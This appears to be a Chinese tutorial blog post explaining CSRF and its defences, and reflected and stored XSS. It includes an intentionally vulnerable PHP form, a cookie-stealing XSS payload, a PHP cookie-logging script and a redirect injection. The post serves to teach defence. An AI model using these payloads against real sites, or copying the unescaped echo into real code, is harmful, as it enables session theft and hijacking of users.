---
title: Web网站中的XSS攻击和CSRF攻击
date: 2021-07-19 09:19:13
tags:
---
### CSRF：跨站点请求伪造
你可以这么理解，黑客写了一个网站，在后端写了一串代码 功能是“给我女朋友发消息说我们分手了”。你当时正在网页跟女友聊天，右下角出现一个美女广告你想关闭不小心点了进去，发现跳转到一个网页，然后你关闭了。晚上你在登陆网页跟女友聊天发现她把你拉黑了。
>  简单理解就是，黑客利用你的cookie信息给服务器发送恶意请求，从而达到他的目的。

### 如何防御CSRF攻击
目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。
##### 1. 验证 HTTP Referer 字段
![请求头中的Referer](/images/re.jpg)
根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。如果黑客恶意请求必须在自己的服务器运行，而他这边的Referer跟你请求的不一致，就会被服务器退回，认为是CSRF攻击
这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
而有些浏览器可以手动修改Referer的值从而达到CSRF攻击目的
#####   2. 在请求地址中添加 token 并验证

CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
该方法还有一个缺点是难以保证 token 本身的安全。黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。
#####   3. 在 HTTP 头中自定义属性并验证

![请求头中的Token](/images/token.png)
这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去
然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。

### XSS：跨站脚本攻击
小A刚刚学习php写了一个购物网站，为了凸显他的网站牛逼写了一个登录才能访问商品页面
```
<?php
session_start();
?>
<!doctype html>
<html>
    <head>
        <title>小A的购物网站</title>
    </head>
    <body>
        <form>
             <input type="text" name="address" value="<?php echo $_GET['address'];?>"/>
             <input type="submit" value="submit" />
        </form>
    </body>
</html>

```
某天小A向女友炫耀自己网站，要女友登录查看，女友当时看了一下源代码顿时惊出冷汗！。告诉小A他这个请求直接把用户通过GET发送过来的表单数据，未经过处理直接写入返回的html流，小A一脸懵逼没懂，随后女友在自己服务器写了一个脚本xss_hacker.php：
```
<?php
$victim = '小A网站的 cookie:'.$_SERVER['REMOTE_ADDR'].':'.$_GET['cookie'];
fill_put_contents('user.txt',$victim);
?>
```
然后到小A网站的表单中提交这么一段字符
```
/><script>window.open("http://localhost/xss_hacker.php?cookie="+document.cookie);</script><!--
```
此时小A看到自己的网页代码变成了这样,顿时茅塞顿开，立马上网给女友买了一支口红表示感谢。
```
<!doctype html>
<html>
    <head>
        <title>小A的购物网站</title>
    </head>
    <body>
        <form>
             <input type="text" name="address" value=""/><script>window.open("http://localhost/xss_hacker.php?cookie="+document.cookie);</script><!--"/>
             <input type="submit" value="submit" />
        </form>
    </body>
</html>

```

上述案例就是XSS攻击（非持久型）。
<script>alert("这就是非持久型XSS攻击")</script>
存储型XSS（持久型）
存储型XSS也被称为持久型XSS（persistent XSS），这种类型的XSS攻击更常见，危害也更大。它和反射型XSS类似，不过会把攻击代码存储到数据库中，任何用户访问包含攻击代码的页面都会被殃及。

比如，某个网站通过表单接收用户的留言，如果服务器接收数据后未经处理就存储到数据库中，那么用户可以在留言中出入任意javaScript代码。比如攻击者在留言中加入一行重定向代码：
```
window.location.href=”http://localhost”;</script>
```

其他任意用户一旦访问关于这条留言的页面，包含这条留言的数据就会被浏览器解析，就会执行其中的javaScript脚本。那么这个用户所在页面就会被重定向到攻击者写入的站点。
XSS的预防可以从多方面着手：
1. 浏览器自身就可以识别简单的XSS攻击字符串，从而阻止简单的XSS攻击；
2. 从根本上说，解决办法是消除网站的XSS漏洞，这就需要网站开发者运用转义安全符等手段；

很多网站都是直接把< > 等字符过滤掉比如：
![汽车之家的搜索](/images/xss.png)
![汽车之家的搜索](/images/xs2.png)